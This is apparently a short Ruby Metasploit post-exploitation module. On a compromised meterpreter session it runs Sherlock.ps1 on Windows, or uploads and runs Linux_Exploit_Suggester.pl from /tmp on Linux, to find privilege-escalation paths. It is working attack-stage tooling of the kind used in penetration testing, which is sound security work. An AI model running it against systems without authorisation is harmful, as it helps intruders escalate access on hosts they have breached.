
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper


  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Priv Exploit",
      'Description'          => %q{
        
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['windows', 'linux'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => [
        
        ]
    ))
  end

  def run

    if sysinfo['OS'] =~ /Win/i
      sherlock = ::File.join(Msf::Config.data_directory, 'exploits', 'sherlock', 'Sherlock.ps1')
      raise "This module require powershell, but target doesn't have." if ! have_powershell?
      script = read_script(sherlock)

      puts psh_exec(script)
    else
      perl_script = ::File.join(Msf::Config.data_directory, 'exploits', 'linux_exploit', 'Linux_Exploit_Suggester.pl')
      filename = '/tmp/' + Rex::Text.rand_text_alpha(7)
      
      upload_file(filename, perl_script)
      puts cmd_exec("perl #{filename}")

      register_file_for_cleanup(filename)
    end
  end

end
